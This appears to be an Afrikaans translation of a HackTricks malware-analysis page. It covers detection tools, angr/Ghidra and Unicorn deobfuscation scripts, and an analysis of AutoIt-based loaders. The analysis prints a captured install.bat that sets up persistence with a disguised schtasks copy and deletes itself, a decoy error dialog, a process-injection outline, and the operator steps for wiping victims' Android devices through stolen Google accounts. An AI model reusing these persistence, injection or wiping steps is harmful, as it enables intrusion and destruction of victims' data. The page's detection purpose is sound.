# Malware-analise

{{#include ../../banners/hacktricks-training.md}}

## Forensika CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Aanlyn Dienste

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline Antivirus- en opsporingshulpmiddels

### Yara

#### Installeer
```bash
sudo apt-get install -y yara
```
#### Berei reëls voor

Gebruik hierdie script om alle yara malware rules vanaf github af te laai en saam te voeg: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Skep die _**rules**_ gids en voer dit uit. Dit sal 'n lêer genaamd _**malware_rules.yar**_ skep wat alle yara rules vir malware bevat.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skandering
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Soek na malware en skep rules

Jy kan die hulpmiddel [**YaraGen**](https://github.com/Neo23x0/yarGen) gebruik om yara rules van 'n binary te genereer. Kyk na hierdie tutorials: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Installeer
```
sudo apt-get install -y clamav
```
#### Skandering
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detecteer moontlik kwaadwillige **capabilities** in uitvoerbare lêers: PE, ELF, .NET. Dit sal dus dinge soos Att\&ck tactics, of verdagte capabilities soos vind:

- check for OutputDebugString error
- run as a service
- create process

Kry dit in die [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC beteken Indicator Of Compromise. 'n IOC is 'n stel **voorwaardes wat identifiseer** sommige moontlik ongewenste sagteware of bevestigde **malware**. Blue Teams gebruik hierdie soort definisie om te **soek na hierdie soort kwaadwillige lêers** in hul **stelsels** en **netwerke**.\
Om hierdie definisies te deel is baie nuttig, aangesien wanneer malware in 'n rekenaar geïdentifiseer word en 'n IOC vir daardie malware geskep word, ander Blue Teams dit kan gebruik om die malware vinniger te identifiseer.

'n Nutsding om IOCs te skep of te wysig is [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Jy kan gereedskap soos [**Redline**](https://www.fireeye.com/services/freeware/redline.html) gebruik om te **soek na gedefinieerde IOCs op 'n toestel**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) is 'n skandeerder vir Simple Indicators of Compromise.\
Opsporing is gebaseer op vier opsporingsmetodes:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) is 'n malware-skandeerder vir Linux wat onder die GNU GPLv2-lisensie vrygestel is, en ontwerp is vir die bedreigings wat in gedeelde, gehoste omgewings ondervind word. Dit gebruik bedreigingsdata van netwerk-rand indringingsdeteksiesisteme om malware wat aktief in aanvalle gebruik word te onttrek en handtekeninge vir deteksie te genereer. Daarbenewens word bedreigingsdata ook verkry uit gebruikersinskrywings via die LMD checkout feature en malware-gemeenskapsbronne.

### rkhunter

Gereedskap soos [**rkhunter**](http://rkhunter.sourceforge.net) kan gebruik word om die lêerstelsel vir moontlike **rootkits** en malware te kontroleer.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) is 'n hulpmiddel wat sal probeer om obfuscated strings in executables te vind deur verskeie tegnieke te gebruik.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) kontroleer basiese dinge binne die executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) is 'n hulpmiddel wat toelaat om inligting oor Windows executables te kry soos imports, exports, headers, maar sal ook virus total nagaan en potensiële Att\&ck techniques vind.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) is 'n instrument om te bepaal of 'n lêer **encrypted** is en om ook **packers** te vind.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is 'n Python script wat 'n verskeidenheid **statistical methods** gebruik om **obfuscated** en **encrypted** inhoud binne text/script lêers te detect. Die beoogde doel van NeoPI is om te help met die **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) doen sy uiterste bes om **obfuscated**/**dodgy code** te detecteer, asook lêers wat **PHP** funksies gebruik wat dikwels in **malwares**/webshells aangetref word.

### Apple Binary Signatures

Wanneer jy 'n **malware sample** kontroleer, moet jy altyd die **check the signature** van die binary nagaan, aangesien die **developer** wat dit geteken het dalk reeds met **malware** verwant is.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Detection Techniques

### File Stacking

As jy weet dat 'n gids wat die **files** van 'n web server bevat **laas op 'n sekere datum bygewerk is**, **Kontroleer** die **datum** waarop al die **files** in die **web server** geskep en gewysig is en as enige datum **verdagtig** is, ondersoek daardie file.

### Baselines

As die **files** van 'n gids **nie gemodifiseer moes gewees het nie**, kan jy die **hash** van die **oorspronklike files** van die gids bereken en dit **vergelyk** met die **huidige**. Enige veranderde sal **verdagtig** wees.

### Statistical Analysis

Wanneer die inligting in logs gestoor is, kan jy **statistieke nagaan**, soos hoeveel keer elke **file** van die **web server** geraadpleeg is — 'n web shell kan een van die mees geraadpleegde wees.

---

### Android in-app native telemetry (no root)

Op Android kan jy native code binne die teiken-app proses instrumenteer deur 'n klein logger library vooraf te laai voordat ander JNI libs inisialiseer. Dit gee vroeë sigbaarheid in native gedrag sonder stelsel-breë hooks of root. 'n Gewilde benadering is SoTap: plaas libsotap.so vir die regte ABI in die APK en injecteer 'n System.loadLibrary("sotap") oproep vroeg (bv. static initializer of Application.onCreate), en versamel dan logs vanaf interne/eksterne paaie of Logcat as fallback.

Sien die Android native reversing bladsy vir opstelbesonderhede en log-paaie:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Sommige Android malware en RASP-beskermde apps verberg JNI method names en signatures deur dit tydens runtime te decodeer voordat RegisterNatives geroep word. Wanneer Frida/ptrace instrumentasie deur anti-debug gedood word, kan jy steeds die platte teks offline herstel deur die in-binêre decoder met angr uit te voer en dan die resultate as kommentaar terug in Ghidra te druk.

Belangrike idee: behandel die decoder binne die .so as 'n oproepbare funksie, voer dit uit op die geobfuskateerde byte blobs in .rodata, en konkretiseer die uitset bytes tot by die eerste \x00 (C-string terminator). Hou angr en Ghidra dieselfde image base gebruik om adres-wedstryd te vermy.

Workflow overview
- Triage in Ghidra: identifiseer die decoder en sy calling convention/argumente in JNI_OnLoad en RegisterNatives opstelling.
- Run angr (CPython3) om die decoder vir elke teikenstring uit te voer en resultate te dump.
- Annotate in Ghidra: auto-comment decoded strings by elke call site vir vinnige JNI-heropbou.

Ghidra triage (JNI_OnLoad pattern)
- Pas JNI datatipes toe op JNI_OnLoad sodat Ghidra JNINativeMethod strukture herken.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Soek na oproepe na RegisterNatives. As die library die naam/signature bou met 'n plaaslike roetine (bv. FUN_00100e10) wat na 'n statiese byte tabel verwys (bv. DAT_00100bf4) en parameters neem soos (encoded_ptr, out_buf, length), is dit 'n ideale teiken vir offline uitvoering.

angr setup (execute the decoder offline)
- Laai die .so met dieselfde base wat in Ghidra gebruik is (bv. 0x00100000) en skakel outomatiese laai van eksterne libs af om die state klein te hou.

<details>
<summary>angr opstelling en offline decoder uitvoering</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Op groot skaal, bou 'n statiese kaart van call sites na die decoder se argumente (encoded_ptr, size). Wrappers kan argumente verberg, so jy kan hierdie mapping handmatig skep vanaf Ghidra xrefs as API-herstel baie ruis lewer.

<details>
<summary>Groepgewys dekodeer verskeie call sites met angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Merk oproepplekke in Ghidra
Opsie A: Jython-only kommentaarskrywer (gebruik 'n vooraf-berekende JSON)
- Aangesien angr CPython3 benodig, hou deobfuskering en annotasie geskei. Voer eers die angr-skrip hierbo uit om decoded_strings.json te genereer. Voer daarna hierdie Jython GhidraScript uit om PRE_COMMENTs by elke oproepplek te skryf (en sluit die aanroeper-funksienaam vir konteks in):

<details>
<summary>Ghidra Jython-skrip om decoded JNI strings te annoteer</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opsie B: Enkel CPython-skrip via pyhidra/ghidra_bridge
- Alternatiewelik, gebruik pyhidra of ghidra_bridge om Ghidra’s API te bestuur vanaf dieselfde CPython-proses wat angr uitvoer. Dit laat toe om decode_string() aan te roep en onmiddellik PRE_COMMENTs te sit sonder ’n intermediêre lêer. Die logika weerspieël die Jython-skrip: bou callsite→function-kaart via ReferenceManager, decodeer met angr, en stel kommentaar.

Waarom dit werk en wanneer om dit te gebruik
- Offline uitvoering omseil RASP/anti-debug: geen ptrace of Frida hooks benodig om stringe te herstel nie.
- Om Ghidra en angr se base_addr in lyn te hou (bv. 0x00100000) verseker dat funksie-/data-adresse oor gereedskap ooreenstem.
- ’n Herhaalbare resep vir decoders: behandel die transformasie as ’n suiwer funksie, allokeer ’n uitsetbuffer in ’n vars state, roep dit aan met (encoded_ptr, out_ptr, len), dan konkreter via state.solver.eval en parse C-strings tot by \x00.

Aantekeninge en valkuils
- Respecteer die teiken ABI/calling convention. angr.factory.callable kies een gebaseer op die arch; as argumente lyk of hulle geskuif is, spesifiseer cc eksplisiet.
- As die decoder ’n zeroed uitsetbuffer verwag, inisiaaliseer outbuf met zeros in die state voor die aanroep.
- Vir position-independent Android .so, voorsien altyd base_addr sodat adresse in angr ooreenstem met dié wat in Ghidra gesien word.
- Gebruik currentProgram.getReferenceManager() om call-xrefs te enumereer selfs al verpak die app die decoder agter dun stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskering van Dinamiese Kontrole-Vloei (JMP/CALL RAX Dispatchers)

Moderne malware-families misbruik swaar Control-Flow Graph (CFG) obfuskasie: in plaas van ’n direkte sprong/call bereken hulle die bestemming tydens run-time en voer ’n `jmp rax` of `call rax` uit. ’n Klein *dispatcher* (tipies nege instruksies) stel die finale teiken afhangend van die CPU ZF/CF flags, wat statiese CFG-herstel heeltemal breek.

Die tegniek — gedemonstreer deur die SLOW#TEMPEST loader — kan gekniehalter word met ’n driedelige workflow wat slegs op IDAPython en die Unicorn CPU emulator steun.

### 1. Lokalisering van elke indirekte jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Onttrek die dispatcher-bytekode
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emulate dit twee keer met Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Voer `run(code,0,0)` en `run(code,1,1)` om die *false* en *true* branch targets te verkry.

### 4. Patch terug 'n direkte jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Na patching, dwing IDA om die funksie weer te heranaliseer sodat die volledige CFG en Hex-Rays-uitset herstel word:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Merk indirekte API-oproepe

Sodra die werklike bestemming van elke `call rax` bekend is, kan jy IDA vertel wat dit is sodat parameter-tipes & veranderlike name outomaties herstel word:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktiese voordele

* Herstel die werklike CFG → dekompilasie gaan van *10* lyne na duisende.
* Maak string-cross-reference & xrefs moontlik, waardeur gedragsrekonstruksie eenvoudig word.

---

## AutoIt-gebaseerde loaders: .a3x dekripsie, Task Scheduler-vermomming en RAT-inspuiting

This intrusion pattern chains a signed MSI, AutoIt loaders compiled to .a3x, and a Task Scheduler job masquerading as a benign app.

### MSI → aangepaste aksies → AutoIt orkestrator

Prosesboom en opdragte uitgevoer deur die MSI aangepaste aksies:

- MsiExec.exe → cmd.exe om install.bat uit te voer
- WScript.exe om 'n misleidende foutdialoog te vertoon
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (laat loader val, stel persistence in, maak self skoon):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (gebruikerslokmiddel):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Belangrike artefakte en vermomming:
- Plaas AutoIt3.exe en IoKlTr.au3 in C:\Users\Public\Music
- Kopieer schtasks.exe na hwpviewer.exe (vermom as Hangul Word Processor viewer)
- Skep 'n geskeduleerde taak "IoKlTr" wat elke 1 minuut loop
- Startup LNK gesien as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stage modules onder %APPDATA%\Google\Browser\ subgidse wat `adb` of `adv` bevat en begin hulle via autoit.vbs/install.bat helpers

Forensiese triage wenke:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Kyk vir hernoemde kopieë van schtasks.exe wat saam met Task XML voorkom: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Algemene paaie: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korreleer proses-skepping: AutoIt3.exe wat regmatige Windows binaries spawn (bv., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders en .a3x payload decryption → injection

- AutoIt-modules word gecompileer met `#AutoIt3Wrapper_Outfile_type=a3x` en decrypt embedded payloads voordat hulle in benign prosesse injected word.
- Waargenome families: QuasarRAT (injected into hncfinder.exe) en RftRAT/RFTServer (injected into cleanmgr.exe), sowel as RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Decryption pattern: derive an AES key via HMAC, decrypt the embedded blob, then inject the plaintext module.

Generiese decryption skelet (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Algemene injectievloei (CreateRemoteThread-style):
- CreateProcess (suspended) van die teikengasheer (bv. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory met gedesifreerde module/shellcode
- CreateRemoteThread of QueueUserAPC om die payload uit te voer

Opsporingsidees
- AutoIt3.exe wat as kindproses deur MsiExec.exe of WScript.exe begin word en stelselhulpprogramme opstart
- Lêers met `.a3x`-uitbreidings of AutoIt-script-uitvoerders in openbare/gebruiker-skryfbare paaie
- Verdagte geskeduleerde take wat AutoIt3.exe of nie-Microsoft-ondertekende binaries uitvoer, met minutevlak-triggers

### Rekening-oorgreepmisbruik van Android Find My Device (Find Hub)

Tydens die Windows-inbraak het operateurs gesteelde Google-aanmeldbesonderhede gebruik om die slagoffer se Android-toestelle herhaaldelik uit te vee, en kennisgewings te onderdruk terwyl hulle toegang uitgebrei het via die slagoffer se op die desktop aangemelde messenger.

Operateurstappe (van 'n aangemelde blaaieressie):
- Besigtig Google Account → Security → Your devices; volg Find My Phone → Find Hub (https://www.google.com/android/find)
- Kies toestel → voer Google-wagwoord weer in → gee "Erase device" (fabrieksinstelling); herhaal om herstel te vertraag
- Opsioneel: vee waarskuwing-e-posse in die gekoppelde posbus uit (bv. Naver) om sekuriteitskennisgewings te versteek

## AdaptixC2: Konfigurasie-uittrekking en TTPs

Sien die toegewyde bladsy:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Verwysings

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
